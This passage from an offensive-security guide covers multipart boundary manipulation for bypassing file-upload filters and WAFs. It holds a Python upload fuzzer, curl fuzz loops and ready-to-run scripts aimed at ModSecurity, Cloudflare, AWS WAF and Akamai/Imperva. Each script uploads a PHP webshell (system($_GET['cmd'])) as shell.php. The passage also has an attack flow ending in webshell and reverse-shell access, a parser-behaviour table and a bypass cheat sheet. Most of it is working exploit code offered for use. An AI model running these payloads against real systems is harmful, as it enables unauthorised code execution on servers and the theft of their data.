        ct = 'multipart/form-data; boundary=BOUND'
        
        endings = {
            'CRLF': '\r\n',
            'LF': '\n',
            'CR': '\r',
            'LFCR': '\n\r',
        }
        for label, le in endings.items():
            body = (
                f'--BOUND{le}'
                f'Content-Disposition: form-data; name="{self.field_name}"; filename="shell.php"{le}'
                f'{le}'
                f'{self.payload}{le}'
                f'--BOUND--{le}'
            )
            self.send(ct, body, f'Line ending: {label}')

    def fuzz_disposition_variations(self):
        """Test Content-Disposition header variations"""
        print("\n[*] Fuzzing Content-Disposition variations...")
        ct = 'multipart/form-data; boundary=BOUND'
        
        disps = [
            f'form-data; name="{self.field_name}"; filename="shell.php"',
            f'form-data; filename="shell.php"; name="{self.field_name}"',
            f'form-data;name="{self.field_name}";filename="shell.php"',
            f'form-data; name="{self.field_name}"; filename="safe.jpg"; filename="shell.php"',
            f'form-data; name="{self.field_name}"; filename="shell.php"; filename="safe.jpg"',
            f'form-data; name="{self.field_name}"; filename="safe.jpg"; filename*=UTF-8\'\'shell.php',
            f'attachment; name="{self.field_name}"; filename="shell.php"',
            f'Form-Data; name="{self.field_name}"; filename="shell.php"',
            f'FORM-DATA; name="{self.field_name}"; filename="shell.php"',
        ]
        for disp in disps:
            body = (
                f'--BOUND\r\n'
                f'Content-Disposition: {disp}\r\n'
                f'\r\n'
                f'{self.payload}\r\n'
                f'--BOUND--\r\n'
            )
            self.send(ct, body, f'Disposition: {disp[:60]}')

    def fuzz_all(self):
        """Run all fuzzing categories"""
        print(f"\n{'='*70}")
        print(f"  Multipart Boundary Fuzzer — {self.target}")
        print(f"{'='*70}")
        
        self.fuzz_boundary_quoting()
        self.fuzz_boundary_duplicates()
        self.fuzz_boundary_whitespace()
        self.fuzz_boundary_special_chars()
        self.fuzz_filename_tricks()
        self.fuzz_content_type_part()
        self.fuzz_duplicate_fields()
        self.fuzz_line_endings()
        self.fuzz_disposition_variations()

        print(f"\n{'='*70}")
        print(f"  Results Summary")
        print(f"{'='*70}")
        success = [r for r in self.results if r['success']]
        print(f"  Total tests: {len(self.results)}")
        print(f"  Successful:  {len(success)}")
        print(f"  Failed:      {len(self.results) - len(success)}")
        if success:
            print(f"\n  Successful uploads:")
            for r in success:
                print(f"    ✅ {r['label']}")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Multipart Boundary Fuzzer')
    parser.add_argument('-t', '--target', required=True, help='Upload endpoint URL')
    parser.add_argument('-f', '--field', default='file', help='Form field name')
    parser.add_argument('-p', '--proxy', default=None, help='Proxy URL (e.g. http://127.0.0.1:8080)')
    parser.add_argument('--category', choices=[
        'quoting', 'duplicates', 'whitespace', 'special',
        'filename', 'content-type', 'fields', 'endings',
        'disposition', 'all'
    ], default='all', help='Fuzzing category')
    args = parser.parse_args()

    fuzzer = MultipartFuzzer(args.target, args.field, proxy=args.proxy)
    
    category_map = {
        'quoting': fuzzer.fuzz_boundary_quoting,
        'duplicates': fuzzer.fuzz_boundary_duplicates,
        'whitespace': fuzzer.fuzz_boundary_whitespace,
        'special': fuzzer.fuzz_boundary_special_chars,
        'filename': fuzzer.fuzz_filename_tricks,
        'content-type': fuzzer.fuzz_content_type_part,
        'fields': fuzzer.fuzz_duplicate_fields,
        'endings': fuzzer.fuzz_line_endings,
        'disposition': fuzzer.fuzz_disposition_variations,
        'all': fuzzer.fuzz_all,
    }
    
    category_map[args.category]()
```

::

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Fuzzer Usage"}
  ```bash [Terminal]
  # Run all fuzzing categories
  python3 boundary_fuzzer.py -t https://target.com/upload --category all

  # Fuzz only filename tricks
  python3 boundary_fuzzer.py -t https://target.com/upload --category filename

  # With Burp proxy
  python3 boundary_fuzzer.py -t https://target.com/upload -p http://127.0.0.1:8080 --category all

  # Custom field name
  python3 boundary_fuzzer.py -t https://target.com/api/avatar -f avatar --category all

  # Specific categories
  python3 boundary_fuzzer.py -t https://target.com/upload --category quoting
  python3 boundary_fuzzer.py -t https://target.com/upload --category duplicates
  python3 boundary_fuzzer.py -t https://target.com/upload --category whitespace
  python3 boundary_fuzzer.py -t https://target.com/upload --category disposition
  python3 boundary_fuzzer.py -t https://target.com/upload --category endings
  ```
  :::

  :::tabs-item{icon="i-lucide-wrench" label="Manual curl Fuzzing"}
  ```bash [Terminal]
  # Quick boundary fuzz loop
  for bound in "BOUND" '"BOUND"' "'BOUND'" "BOUND " " BOUND" "B" "$(python3 -c 'print(\"A\"*200)')"; do
    echo -n "Boundary=$bound: "
    curl -s -o /dev/null -w "%{http_code}" \
      -H "Content-Type: multipart/form-data; boundary=$bound" \
      --data-binary "$(printf -- "--%s\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\n\r\nSHELL\r\n--%s--\r\n" "$bound" "$bound")" \
      https://target.com/upload
    echo ""
  done

  # Filename extension fuzz loop
  for ext in php php3 php4 php5 php7 pht phtml phps phar inc module cgi pl py rb jsp jspx asp aspx ashx asmx cfm shtml; do
    echo -n ".${ext}: "
    curl -s -o /dev/null -w "%{http_code}" \
      -F "file=@shell.txt;filename=shell.${ext};type=image/jpeg" \
      https://target.com/upload
    echo ""
  done

  # Content-Type per-part fuzz
  for mime in "image/jpeg" "image/png" "application/octet-stream" "text/plain" "" "application/x-php" "image/jpeg;charset=php"; do
    echo -n "MIME=$mime: "
    curl -s -o /dev/null -w "%{http_code}" \
      -H "Content-Type: multipart/form-data; boundary=BOUND" \
      --data-binary "$(printf -- '--BOUND\r\nContent-Disposition: form-data; name="file"; filename="shell.php"\r\nContent-Type: %s\r\n\r\nSHELL\r\n--BOUND--\r\n' "$mime")" \
      https://target.com/upload
    echo ""
  done
  ```
  :::
::

---

## WAF-Specific Bypass Techniques

::steps{level="4"}

#### ModSecurity / OWASP CRS Bypass

```bash [Terminal]
# ModSecurity parses boundary strictly — exploit relaxed backend parsing

# Technique 1: Boundary with quotes that ModSecurity strips but backend keeps
curl -v \
  -H 'Content-Type: multipart/form-data; boundary="--boundary"' \
  --data-binary $'----boundary\r\nContent-Disposition: form-data; name="file"; filename="shell.php"\r\n\r\n<?php system($_GET["cmd"]); ?>\r\n----boundary--\r\n' \
  https://target.com/upload

# Technique 2: Oversized boundary exceeding CRS buffer
python3 -c "
import requests
bound = 'X' * 4096
body = f'--{bound}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\n\r\n<?php system(\$_GET[\"cmd\"]); ?>\r\n--{bound}--\r\n'
r = requests.post('https://target.com/upload',
    headers={'Content-Type': f'multipart/form-data; boundary={bound}'},
    data=body.encode(), verify=False)
print(r.status_code)
"

# Technique 3: Multipart body exceeding inspection limit
python3 -c "
import requests
padding = 'A' * 1048576  # 1MB of padding before payload
bound = 'BOUND'
body = f'--{bound}\r\nContent-Disposition: form-data; name=\"padding\"\r\n\r\n{padding}\r\n--{bound}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\n\r\n<?php system(\$_GET[\"cmd\"]); ?>\r\n--{bound}--\r\n'
r = requests.post('https://target.com/upload',
    headers={'Content-Type': f'multipart/form-data; boundary={bound}'},
    data=body.encode(), verify=False)
print(r.status_code)
"

# Technique 4: Content-Type without multipart keyword
curl -v \
  -H 'Content-Type: mUlTiPaRt/FoRm-DaTa; boundary=BOUND' \
  --data-binary $'--BOUND\r\nContent-Disposition: form-data; name="file"; filename="shell.php"\r\n\r\n<?php system($_GET["cmd"]); ?>\r\n--BOUND--\r\n' \
  https://target.com/upload
```

#### Cloudflare WAF Bypass

```bash [Terminal]
# Cloudflare inspects multipart bodies — bypass via parser confusion

# Technique 1: Header folding in Content-Disposition
python3 -c "
import requests
body = (
    '--BOUND\r\n'
    'Content-Disposition: form-data;\r\n'
    ' name=\"file\"; filename=\"shell.php\"\r\n'
    '\r\n'
    '<?php system(\$_GET[\"cmd\"]); ?>\r\n'
    '--BOUND--\r\n'
)
r = requests.post('https://target.com/upload',
    headers={'Content-Type': 'multipart/form-data; boundary=BOUND'},
    data=body.encode())
print(r.status_code, r.text[:200])
"

# Technique 2: Payload split across multiple parts with same name
python3 -c "
import requests
body = (
    '--BOUND\r\n'
    'Content-Disposition: form-data; name=\"file\"; filename=\"shell.ph\"\r\n\r\n'
    '<?php system(\r\n'
    '--BOUND\r\n'
    'Content-Disposition: form-data; name=\"file\"; filename=\"p\"\r\n\r\n'
    '\$_GET[\"cmd\"]); ?>\r\n'
    '--BOUND--\r\n'
)
r = requests.post('https://target.com/upload',
    headers={'Content-Type': 'multipart/form-data; boundary=BOUND'},
    data=body.encode())
print(r.status_code)
"

# Technique 3: Unicode normalization in filename
python3 -c "
import requests
# Fullwidth characters that normalize to ASCII
filename = 'shell\uff0ephp'  # Fullwidth period
body = f'--BOUND\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{filename}\"\r\n\r\n<?php system(\$_GET[\"cmd\"]); ?>\r\n--BOUND--\r\n'
r = requests.post('https://target.com/upload',
    headers={'Content-Type': 'multipart/form-data; boundary=BOUND'},
    data=body.encode('utf-8'))
print(r.status_code)
"
```

#### AWS WAF Bypass

```bash [Terminal]
# AWS WAF has inspection size limits and specific parsing behavior

# Technique 1: Body exceeding AWS WAF inspection limit (8KB for basic, 64KB for advanced)
python3 -c "
import requests
# 65KB of junk data before actual upload part
junk = 'X' * 66000
bound = 'BOUND'
body = (
    f'--{bound}\r\n'
    f'Content-Disposition: form-data; name=\"junk\"\r\n\r\n'
    f'{junk}\r\n'
    f'--{bound}\r\n'
    f'Content-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\n\r\n'
    f'<?php system(\$_GET[\"cmd\"]); ?>\r\n'
    f'--{bound}--\r\n'
)
r = requests.post('https://target.com/upload',
    headers={'Content-Type': f'multipart/form-data; boundary={bound}'},
    data=body.encode())
print(f'Status: {r.status_code}')
"

# Technique 2: Multiple Content-Type headers
curl -v \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Content-Type: multipart/form-data; boundary=BOUND' \
  --data-binary $'--BOUND\r\nContent-Disposition: form-data; name="file"; filename="shell.php"\r\n\r\n<?php system($_GET["cmd"]); ?>\r\n--BOUND--\r\n' \
  https://target.com/upload

# Technique 3: Chunked transfer with multipart
curl -v \
  -H 'Content-Type: multipart/form-data; boundary=BOUND' \
  -H 'Transfer-Encoding: chunked' \
  --data-binary $'--BOUND\r\nContent-Disposition: form-data; name="file"; filename="shell.php"\r\n\r\n<?php system($_GET["cmd"]); ?>\r\n--BOUND--\r\n' \
  https://target.com/upload
```

#### Akamai / Imperva Bypass

```bash [Terminal]
# Technique 1: Preamble content before first boundary
python3 -c "
import requests
body = (
    'This preamble may confuse the WAF parser into skipping inspection\r\n'
    'More preamble content here with safe-looking data\r\n'
    '--BOUND\r\n'
    'Content-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\n\r\n'
    '<?php system(\$_GET[\"cmd\"]); ?>\r\n'
    '--BOUND--\r\n'
)
r = requests.post('https://target.com/upload',
    headers={'Content-Type': 'multipart/form-data; boundary=BOUND'},
    data=body.encode())
print(r.status_code)
"

# Technique 2: Many parts before malicious one (exhaust WAF inspection budget)
python3 -c "
import requests
bound = 'BOUND'
parts = ''
for i in range(100):
    parts += f'--{bound}\r\nContent-Disposition: form-data; name=\"field{i}\"\r\n\r\nvalue{i}\r\n'
parts += f'--{bound}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\n\r\n<?php system(\$_GET[\"cmd\"]); ?>\r\n'
parts += f'--{bound}--\r\n'
r = requests.post('https://target.com/upload',
    headers={'Content-Type': f'multipart/form-data; boundary={bound}'},
    data=parts.encode())
print(r.status_code)
"
```

::

---

## Attack Flow Diagram

::code-collapse

```text [Multipart Boundary Manipulation Attack Flow]
┌──────────────────────────────────────────────────────────────────────┐
│                      RECONNAISSANCE                                  │
├──────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  ┌─────────────────┐   ┌──────────────────┐   ┌──────────────────┐  │
│  │ Identify Upload  │   │ Capture Normal   │   │ Fingerprint      │  │
│  │ Endpoints        │──▶│ Multipart        │──▶│ Backend Parser   │  │
│  │                  │   │ Request          │   │ & WAF            │  │
│  └─────────────────┘   └──────────────────┘   └────────┬─────────┘  │
│                                                         │            │
└─────────────────────────────────────────────────────────┼────────────┘
                                                          │
┌─────────────────────────────────────────────────────────┼────────────┐
│                      BOUNDARY ATTACKS                    │            │
├─────────────────────────────────────────────────────────┼────────────┤
│                                                         ▼            │
│  ┌──────────────────────────────────────────────────────────────┐    │
│  │                  BOUNDARY STRING MANIPULATION                │    │
│  ├──────────────────────────────────────────────────────────────┤    │
│  │                                                              │    │
│  │  ┌──────────────┐  ┌──────────────┐  ┌───────────────────┐  │    │
│  │  │ Duplicate    │  │ Quoted vs    │  │ Whitespace &      │  │    │
│  │  │ Boundaries   │  │ Unquoted     │  │ Padding           │  │    │
│  │  └──────┬───────┘  └──────┬───────┘  └─────────┬─────────┘  │    │
│  │         │                 │                     │            │    │
│  │  ┌──────────────┐  ┌──────────────┐  ┌───────────────────┐  │    │
│  │  │ Special      │  │ Oversized    │  │ Nested            │  │    │
│  │  │ Characters   │  │ Boundaries   │  │ Multipart         │  │    │
│  │  └──────┬───────┘  └──────┬───────┘  └─────────┬─────────┘  │    │
│  │         │                 │                     │            │    │
│  └─────────┼─────────────────┼─────────────────────┼────────────┘    │
│            └─────────────────┼─────────────────────┘                 │
│                              ▼                                       │
│  ┌──────────────────────────────────────────────────────────────┐    │
│  │              CONTENT-DISPOSITION MANIPULATION                │    │
│  ├──────────────────────────────────────────────────────────────┤    │
│  │                                                              │    │
│  │  ┌──────────────┐  ┌──────────────┐  ┌───────────────────┐  │    │
│  │  │ Filename     │  │ Duplicate    │  │ filename*=        │  │    │
│  │  │ Encoding     │  │ Parameters   │  │ (RFC 5987)        │  │    │
│  │  │ • URL encode │  │ • First wins │  │                   │  │    │
│  │  │ • Unicode    │  │ • Last wins  │  │                   │  │    │
│  │  │ • Null byte  │  │              │  │                   │  │    │
│  │  │ • Backslash  │  │              │  │                   │  │    │
│  │  └──────────────┘  └──────────────┘  └───────────────────┘  │    │
│  │                                                              │    │
│  │  ┌──────────────┐  ┌──────────────┐  ┌───────────────────┐  │    │
│  │  │ Case         │  │ Header       │  │ Whitespace        │  │    │
│  │  │ Variation    │  │ Folding      │  │ Manipulation      │  │    │
│  │  └──────────────┘  └──────────────┘  └───────────────────┘  │    │
│  └──────────────────────────────────────────────────────────────┘    │
│                              │                                       │
│                              ▼                                       │
│  ┌──────────────────────────────────────────────────────────────┐    │
│  │                  PARSER DIFFERENTIAL                         │    │
│  ├──────────────────────────────────────────────────────────────┤    │
│  │                                                              │    │
│  │  ┌───────────────────────────────────────────────────────┐   │    │
│  │  │              WAF Parser                               │   │    │
│  │  │  • Sees: boundary=SAFE → safe.jpg ✓                   │   │    │
│  │  │  • Inspection: PASS                                   │   │    │
│  │  └───────────────────────┬───────────────────────────────┘   │    │
│  │                          │ Request forwarded                 │    │
│  │  ┌───────────────────────▼───────────────────────────────┐   │    │
│  │  │              Backend Parser                           │   │    │
│  │  │  • Sees: boundary=EVIL → shell.php                    │   │    │
│  │  │  • Processing: EXECUTE PAYLOAD                        │   │    │
│  │  └───────────────────────────────────────────────────────┘   │    │
│  └──────────────────────────────────────────────────────────────┘    │
│                              │                                       │
│                              ▼                                       │
│  ┌──────────────────────────────────────────────────────────────┐    │
│  │                  ADVANCED TECHNIQUES                         │    │
│  ├──────────────────────────────────────────────────────────────┤    │
│  │  • CRLF vs LF vs CR line endings                            │    │
│  │  • Chunked Transfer + Multipart                              │    │
│  │  • Content-Length mismatch                                   │    │
│  │  • Duplicate field pollution (first/last wins)               │    │
│  │  • Array notation (file[])                                   │    │
│  │  • Preamble/Epilogue content                                │    │
│  │  • Hidden form field injection                              │    │
│  │  • Content-Transfer-Encoding abuse                          │    │
│  │  • HTTP Request Smuggling chains                             │    │
│  │  • WAF inspection budget exhaustion                          │    │
│  └──────────────────────────────────────────────────────────────┘    │
│                              │                                       │
└──────────────────────────────┼───────────────────────────────────────┘
                               │
                               ▼
                  ┌──────────────────────┐
                  │   CODE EXECUTION     │
                  │   • Webshell access  │
                  │   • Reverse shell    │
                  │   • Data exfil       │
                  └──────────────────────┘
```

::

---

## Parser Behavior Reference

::collapsible

| Technique | PHP | Node (multer) | Node (busboy) | Python (Django) | Python (Flask) | Java (Spring) | .NET | Go | Ruby (Rack) |
|-----------|:---:|:---:|:---:|:---:|:---:|:---:|:---:|:---:|:---:|
| Dup boundary param | Last | First | First | Last | Last | First | First | First | Last |
| Quoted boundary | Strip | Strip | Strip | Strip | Strip | Keep | Strip | Strip | Strip |
| Dup filename param | Last | First | Last | Last | First | First | Last | First | Last |
| filename* override | ✅ | ❌ | ❌ | ✅ | ❌ | ✅ | ✅ | ❌ | ❌ |
| LF-only endings | ✅ | ✅ | ✅ | ✅ | ✅ | ❌ | ✅ | ✅ | ✅ |
| CR-only endings | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ |
| Header folding | ❌ | ✅ | ❌ | ❌ | ❌ | ✅ | ❌ | ❌ | ❌ |
| Null in filename | Truncate | Keep | Keep | Reject | Reject | Reject | Truncate | Keep | Keep |
| Preamble content | Ignore | Ignore | Ignore | Ignore | Ignore | Ignore | Ignore | Ignore | Ignore |
| No Content-Dispo | Skip | Error | Skip | Skip | Error | Skip | Skip | Skip | Skip |
| Dup name= fields | Last | First | First | Last | First | Last | First | First | Last |
| name[] array | ✅ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ❌ | ✅ |
| Oversized boundary | Accept | Accept | Accept | Reject | Accept | Accept | Accept | Accept | Accept |
| Missing final -- | Accept | Accept | Accept | Accept | Reject | Accept | Accept | Accept | Accept |
| Extra -- prefix | Accept | Reject | Accept | Accept | Accept | Reject | Accept | Accept | Accept |

::badge
✅ = Supported/Accepted | ❌ = Rejected/Unsupported | Keep = Preserved as-is | Strip = Quotes removed
::

::

---

## Quick Reference Cheat Sheet

::field-group
  ::field{name="Duplicate Boundary" type="header"}
  `Content-Type: multipart/form-data; boundary=SAFE; boundary=EVIL`
  ::

  ::field{name="Quoted Boundary" type="header"}
  `Content-Type: multipart/form-data; boundary="BOUND"` (body uses `--BOUND`)
  ::

  ::field{name="Duplicate Filename" type="header"}
  `Content-Disposition: form-data; name="file"; filename="safe.jpg"; filename="shell.php"`
  ::

  ::field{name="RFC 5987 Filename" type="header"}
  `Content-Disposition: form-data; name="file"; filename="safe.jpg"; filename*=UTF-8''shell.php`
  ::

  ::field{name="Null Byte Filename" type="header"}
  `filename="shell.php\x00.jpg"`
  ::

  ::field{name="No Space After Semicolon" type="header"}
  `Content-Type: multipart/form-data;boundary=BOUND`
  ::

  ::field{name="Header Folding" type="header"}
  `Content-Disposition: form-data;\r\n name="file"; filename="shell.php"`
  ::

  ::field{name="LF-Only Line Endings" type="technique"}
  Replace all `\r\n` with `\n` in multipart body
  ::

  ::field{name="Preamble Injection" type="technique"}
  Add content before first `--BOUNDARY` delimiter
  ::

  ::field{name="Field Pollution" type="technique"}
  Submit two parts with `name="file"` — safe.jpg first, shell.php second (or reversed)
  ::

  ::field{name="WAF Budget Exhaustion" type="technique"}
  Add 100+ junk parts or 64KB+ padding before malicious part
  ::

  ::field{name="Boundary Fuzzer" type="command"}
  `python3 boundary_fuzzer.py -t https://target.com/upload --category all`
  ::
::